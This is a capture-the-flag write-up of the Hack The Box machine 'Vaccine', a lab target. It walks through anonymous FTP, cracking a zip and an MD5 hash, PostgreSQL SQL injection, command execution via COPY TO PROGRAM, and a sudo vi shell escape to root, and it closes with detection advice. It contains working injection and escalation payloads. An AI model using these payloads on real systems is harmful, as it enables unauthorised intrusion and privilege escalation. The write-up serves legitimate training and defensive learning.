# Vaccine — Hack The Box

> Starting Point, Tier 2. Linux. Two flags: user and root.

## Summary

An FTP share with a password-protected backup, a login page that compares an MD5
instead of a password, and a search box that runs as a PostgreSQL superuser.
Each step hands you the key to the next one: the archive gives you the login,
the login gives you the dashboard, the dashboard's source gives you the database
password, and that same password is the operating system password for the
database account. From there a single sudo rule is enough to become root. It
was my first root shell.

## Enumeration

```
nmap -p- --min-rate 3000 -T4 -oN allports.txt 10.129.x.x
nmap -sCV -p21,22,80 -oN services.txt 10.129.x.x
```

```
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.0p1 Ubuntu 6ubuntu0.1
80/tcp open  http    Apache httpd 2.4.41 (Ubuntu)
```

The HTTP title was "MegaCorp Login", so there was an application behind the
page. The more interesting line was the FTP script output:
`Anonymous FTP login allowed`. No anonymous upload, but a readable share.

## Dead ends

I tried the login page first, guessing a few admin passwords, before accepting
that the credentials had to come from somewhere on the box.

Later, at the sudo step, `sudo -n -l` returned "a password is required", which
looks like a dead end if you assume `NOPASSWD`. The account did have a password:
the database password from the web application's source. Reusing it worked, and
that is the sort of thing worth trying before assuming a rule is unreadable.

The other false start was feeding keystrokes into `vi` through a pipe. The first
attempt raced the sudo password prompt, so `vi` consumed lines that were meant
for it and died on a hangup. Delays between the password and the commands fixed
it.

## Foothold

### The archive

Anonymous FTP held one file:

```
ftp> ls
-rwxr-xr-x    1 0        0            2533 Apr 13  2021 backup.zip
```

It was password protected. `zip2john` converted it to a hash John could work on,
and `common.txt` cracked it in seconds:

```
zip2john backup.zip > zip.hash
john --wordlist=~/wordlists/common.txt zip.hash
```

The archive contained the source of the login page and its stylesheet. The
password check was the interesting part:

```php
if($_POST['username'] === 'admin' &&
   md5($_POST['password']) === "<hardcoded md5>") {
```

A hardcoded hash is a password with extra steps. Cracking the MD5 gave the admin
password, and posting it to `/` returned a `302` to `dashboard.php`.

### The injection

`dashboard.php` takes a `search` parameter and concatenates it straight into the
query:

```php
$q = "Select * from cars where name ilike '%". $_REQUEST["search"] ."%'";
$result = pg_query($conn, $q);
```

`pg_query` accepts multiple statements, and the database account is `postgres`,
a superuser. A single quote produced the raw PostgreSQL error, which confirmed
the parameter was unfiltered. `ORDER BY` showed the query returns five columns,
so the union needs five values:

```
' ORDER BY 5--        (ok)
' ORDER BY 6--        (error)
```

That was enough to read files:

```
' AND 1=2 UNION SELECT null,current_user||' | '||version(),null,null,null--
```

```
postgres | PostgreSQL 11.7 (Ubuntu 11.7-0ubuntu0.19.10.1) on x86_64-pc-linux-gnu
```

`current_setting('is_superuser')` returned `on`, which matters more than the
version: a superuser can make PostgreSQL run operating system commands.

### Command execution

```
'; COPY (SELECT 1) TO PROGRAM 'id > /tmp/who.txt';--
```

Read back through `pg_read_file`, the output was:

```
uid=111(postgres) gid=117(postgres) groups=117(postgres),116(ssl-cert)
```

From there I used the injection itself as the shell. Commands were base64
encoded, decoded and executed by `sh`, and the output came back through a second
query that read the file. It is slower than a reverse shell, but it survives a
flaky connection and leaves a clean record of every step.

Reading `/var/www/html/dashboard.php` off the box gave the connection string,
including the database password. The same password authenticated `sudo` on the
operating system.

## Privilege escalation

```
$ sudo -l
User postgres may run the following commands on vaccine:
    (ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf
```

The rule is narrower than "sudo vi". The argument is pinned, so `vi -c ...` does
not match and sudo refuses it. It has to be that exact command line, and the
escape happens inside the editor:

```
sudo -S /bin/vi /etc/postgresql/11/main/pg_hba.conf
:!id -un
```

```
root
```

`:` drops into ex mode, `!` runs a shell command as the editor's user, and the
editor is running as root. No file was modified; the config was a convenient
argument.

## What I would do differently

- Read the source before attacking the login. The archive was the intended route
  and would have saved the guessing.
- Check for configuration leaks in `sudo -l` output instead of assuming
  `NOPASSWD`. Password-protected sudo is still a finding when the password is in
  the application.
- Automate the injection channel earlier. Typing commands through `COPY TO
  PROGRAM` by hand is slow, and the base64 wrapper made it repeatable.

## Detections

- Anonymous FTP is a configuration decision with a log line. A backup archive
  readable by `anonymous` is a data exposure even before anyone cracks it.
- `pg_read_file` and `COPY ... TO PROGRAM` are not normal application traffic.
  They should alert, because the only reason either exists in a query is that
  someone is abusing it.
- A superuser account backing a web application is the root cause here. The web
  user needed SELECT on one table, and it had the ability to run programs.
- `sudo vi <config>` shows up in auditd as `vi` starting a child shell. Command
  logging on the sudo rule, or `log_input`/`log_output`, would capture the
  `:!` line that makes it a privilege escalation.

---

### Publishing checklist

- [x] Machine is retired or Starting Point
- [x] No flags, hashes, or cracked credentials
- [x] No target IPs included
- [x] Written in my own words
